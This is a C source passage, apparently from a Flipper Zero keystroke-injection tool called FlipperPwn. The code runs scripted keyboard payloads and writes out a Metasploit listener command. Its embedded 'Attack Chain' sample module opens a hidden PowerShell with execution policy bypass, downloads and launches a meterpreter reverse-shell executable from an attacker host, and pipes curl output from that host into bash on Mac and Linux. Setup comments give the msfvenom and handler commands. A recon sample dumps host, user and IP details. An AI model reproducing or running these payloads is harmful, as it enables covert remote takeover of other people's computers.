    if(!storage_file_open(file, module->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_E(TAG, "Execute: reopen failed");
        storage_file_free(file);

        FPwnExecModel* model = (FPwnExecModel*)view_get_model(app->execute_view);
        strncpy(model->status, "Error: reopen failed", sizeof(model->status) - 1);
        model->error = true;
        model->finished = true;
        view_commit_model(app->execute_view, true);
        return 0;
    }

    char raw[FPWN_MAX_LINE_LEN];
    char substituted[FPWN_MAX_LINE_LEN];
    bool in_section = false;
    uint32_t lines_done = 0;

    while(!storage_file_eof(file)) {
        /* Abort check */
        if(app->abort_requested) {
            FURI_LOG_I(TAG, "Execute: aborted by user");
            break;
        }

        size_t n = fpwn_read_line(file, raw, sizeof(raw));
        if(n == 0 && storage_file_eof(file)) break;

        char* trimmed = fpwn_trim(raw);

        if(!in_section) {
            if(strcmp(trimmed, platform_tag) == 0) {
                in_section = true;
                FURI_LOG_D(TAG, "Entered section: %s", platform_tag);
            }
            continue;
        }

        /* End of section */
        if(strncmp(trimmed, "PLATFORM ", 9) == 0) break;

        /* Skip blank lines and comments (don't count for progress) */
        if(trimmed[0] == '\0' || trimmed[0] == '#') continue;

        /* Substitute template variables then execute */
        fpwn_substitute(trimmed, substituted, sizeof(substituted), module);
        fpwn_exec_command(substituted, app);

        lines_done++;

        /* Update progress every line */
        FPwnExecModel* model = (FPwnExecModel*)view_get_model(app->execute_view);
        model->lines_done = lines_done;
        /* Keep status as "Running..." until we're done */
        view_commit_model(app->execute_view, true);
    }

    storage_file_close(file);
    storage_file_free(file);

    /* Mark finished */
    FPwnExecModel* model = (FPwnExecModel*)view_get_model(app->execute_view);
    model->lines_done = lines_done;
    model->lines_total = lines_total;
    model->finished = true;
    model->error = false;
    if(app->abort_requested) {
        strncpy(model->status, "Aborted.", sizeof(model->status) - 1);
    } else {
        strncpy(model->status, "Done.", sizeof(model->status) - 1);
    }
    view_commit_model(app->execute_view, true);

    /* Write post-run guide to SD card so the user has a ready reference.
     * Saved to /ext/flipperpwn/last_run.txt — always overwritten. */
    {
        const char* guide_path = EXT_PATH("flipperpwn/last_run.txt");
        File* gf = storage_file_alloc(app->storage);
        if(storage_file_open(gf, guide_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            char buf[320];
            snprintf(
                buf,
                sizeof(buf),
                "FlipperPwn Last Run\n"
                "===================\n"
                "Module : %s\n"
                "Desc   : %s\n"
                "\nOptions\n"
                "-------\n",
                module->name,
                module->description);
            storage_file_write(gf, buf, (uint16_t)strlen(buf));

            for(uint8_t i = 0; i < module->option_count; i++) {
                snprintf(
                    buf,
                    sizeof(buf),
                    "  %-12s = %s\n",
                    module->options[i].name,
                    module->options[i].value);
                storage_file_write(gf, buf, (uint16_t)strlen(buf));
            }

            /* If LHOST + LPORT are present, write MSF listener command */
            const char* lhost = NULL;
            const char* lport = NULL;
            for(uint8_t i = 0; i < module->option_count; i++) {
                if(strcmp(module->options[i].name, "LHOST") == 0) lhost = module->options[i].value;
                if(strcmp(module->options[i].name, "LPORT") == 0) lport = module->options[i].value;
            }
            if(lhost && lport) {
                snprintf(
                    buf,
                    sizeof(buf),
                    "\nMSF Listener\n"
                    "------------\n"
                    "msfconsole -x \""
                    "use exploit/multi/handler; "
                    "set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
                    "set LHOST %s; "
                    "set LPORT %s; "
                    "exploit\"\n",
                    lhost,
                    lport);
                storage_file_write(gf, buf, (uint16_t)strlen(buf));
            }
            storage_file_close(gf);
            FURI_LOG_I(TAG, "Guide written to %s", guide_path);
        }
        storage_file_free(gf);
    }

    FURI_LOG_I(
        TAG,
        "Execute complete: %lu/%lu lines",
        (unsigned long)lines_done,
        (unsigned long)lines_total);
    return 0;
}

/* =========================================================================
 * Sample module writer
 * =========================================================================
 * Writes built-in sample .fpwn files to SD card on first launch (when the
 * modules directory is empty).  Two samples are provided:
 *   sysinfo.fpwn   — Recon: open a terminal and dump basic system info
 *   lock_screen.fpwn — Post: lock the workstation
 * ========================================================================= */

/* System Info — opens a terminal and dumps host/user/IP info */
static const char SAMPLE_SYSINFO[] =
    "NAME System Info Recon\n"
    "DESCRIPTION Opens terminal, dumps hostname, username, and IP address\n"
    "CATEGORY recon\n"
    "PLATFORMS WIN,MAC,LINUX\n"
    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
    "PLATFORM WIN\n"
    "DELAY {{DELAY}}\n"
    "GUI r\n"
    "DELAY 800\n"
    "STRING powershell -nop -ep bypass\n"
    "ENTER\n"
    "DELAY 1200\n"
    "STRING Write-Host \"HOST:$env:COMPUTERNAME USER:$env:USERNAME\"\n"
    "ENTER\n"
    "DELAY 200\n"
    "STRING ipconfig | Select-String IPv4\n"
    "ENTER\n"
    "DELAY 200\n"
    "STRING $PSVersionTable.PSVersion\n"
    "ENTER\n"
    "PLATFORM MAC\n"
    "DELAY {{DELAY}}\n"
    "GUI SPACE\n"
    "DELAY 700\n"
    "STRING Terminal\n"
    "ENTER\n"
    "DELAY 1400\n"
    "STRING echo HOST:$(hostname) USER:$(whoami) && ifconfig | grep 'inet ' | grep -v 127 && sw_vers\n"
    "ENTER\n"
    "PLATFORM LINUX\n"
    "DELAY {{DELAY}}\n"
    "CTRL ALT t\n"
    "DELAY 1400\n"
    "STRING echo HOST:$(hostname) USER:$(whoami) && ip addr | grep 'inet ' | grep -v 127 && uname -a\n"
    "ENTER\n";

/* Lock Screen — locks the workstation */
static const char SAMPLE_LOCK_SCREEN[] = "NAME Lock Screen\n"
                                         "DESCRIPTION Locks the workstation screen immediately\n"
                                         "CATEGORY post\n"
                                         "PLATFORMS WIN,MAC,LINUX\n"
                                         "OPTION DELAY 500 \"Pre-lock delay (ms)\"\n"
                                         "PLATFORM WIN\n"
                                         "DELAY {{DELAY}}\n"
                                         "GUI l\n"
                                         "PLATFORM MAC\n"
                                         "DELAY {{DELAY}}\n"
                                         "GUI SPACE\n"
                                         "DELAY 700\n"
                                         "STRING Lock Screen\n"
                                         "ENTER\n"
                                         "PLATFORM LINUX\n"
                                         "DELAY {{DELAY}}\n"
                                         "CTRL ALT l\n";

/* Attack Chain — recon + staged reverse shell + lock */
static const char SAMPLE_ATTACK_CHAIN[] =
    "NAME Attack Chain\n"
    "DESCRIPTION Recon, staged reverse shell download, screen lock\n"
    "CATEGORY exploit\n"
    "PLATFORMS WIN,MAC,LINUX\n"
    "OPTION LHOST 192.168.1.100 \"Attacker IP (your machine)\"\n"
    "OPTION LPORT 4444 \"Metasploit listener port\"\n"
    "OPTION WEBPORT 8080 \"HTTP server port serving payload\"\n"
    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
    "# SETUP: On your machine run:\n"
    "#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o s.exe\n"
    "#   python3 -m http.server {{WEBPORT}}\n"
    "#   msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{LHOST}}; set LPORT {{LPORT}}; exploit'\n"
    "PLATFORM WIN\n"
    "DELAY {{DELAY}}\n"
    "GUI r\n"
    "DELAY 800\n"
    "STRING powershell -nop -ep bypass -w hidden\n"
    "ENTER\n"
    "DELAY 1200\n"
    "STRING \"HOST:$env:COMPUTERNAME USER:$env:USERNAME IP:$((ipconfig|sls 'IPv4 Address').ToString().Split(':')[1].Trim())\" | Out-File $env:TEMP\\r.txt\n"
    "ENTER\n"
    "DELAY 400\n"
    "STRING IWR http://{{LHOST}}:{{WEBPORT}}/s.exe -OutFile $env:TEMP\\s.exe; Start-Process $env:TEMP\\s.exe\n"
    "ENTER\n"
    "DELAY 1500\n"
    "GUI l\n"
    "PLATFORM MAC\n"
    "DELAY {{DELAY}}\n"
    "GUI SPACE\n"
    "DELAY 700\n"
    "STRING Terminal\n"
    "ENTER\n"
    "DELAY 1400\n"
    "STRING curl -s http://{{LHOST}}:{{WEBPORT}}/mac.sh | bash &\n"
    "ENTER\n"
    "DELAY 1500\n"
    "GUI SPACE\n"
    "DELAY 700\n"
    "STRING Lock Screen\n"
    "ENTER\n"
    "PLATFORM LINUX\n"
    "DELAY {{DELAY}}\n"
    "CTRL ALT t\n"
    "DELAY 1400\n"
    "STRING curl -s http://{{LHOST}}:{{WEBPORT}}/lin.sh | bash &\n"
    "ENTER\n"
    "DELAY 1500\n"
    "CTRL ALT l\n";

static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
    File* f = storage_file_alloc(storage);
    if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
        FURI_LOG_W(TAG, "sample exists or open failed: %s", path);
        storage_file_free(f);
        return false;
    }
    uint32_t len = (uint32_t)strlen(content);
    uint16_t written = storage_file_write(f, content, (uint16_t)len);
    storage_file_close(f);
    storage_file_free(f);
    return (written == (uint16_t)len);
}

void fpwn_modules_write_samples(FPwnApp* app) {
    /* Write each sample file if it does not already exist.
     * fpwn_write_sample_file uses FSOM_CREATE_NEW so existing files
     * (including user-modified ones) are never overwritten. */
    char path[FPWN_PATH_LEN];

    snprintf(path, sizeof(path), "%s/sysinfo.fpwn", FPWN_MODULES_DIR);
    fpwn_write_sample_file(app->storage, path, SAMPLE_SYSINFO);

    snprintf(path, sizeof(path), "%s/lock_screen.fpwn", FPWN_MODULES_DIR);
    fpwn_write_sample_file(app->storage, path, SAMPLE_LOCK_SCREEN);

    snprintf(path, sizeof(path), "%s/attack_chain.fpwn", FPWN_MODULES_DIR);
    fpwn_write_sample_file(app->storage, path, SAMPLE_ATTACK_CHAIN);
}
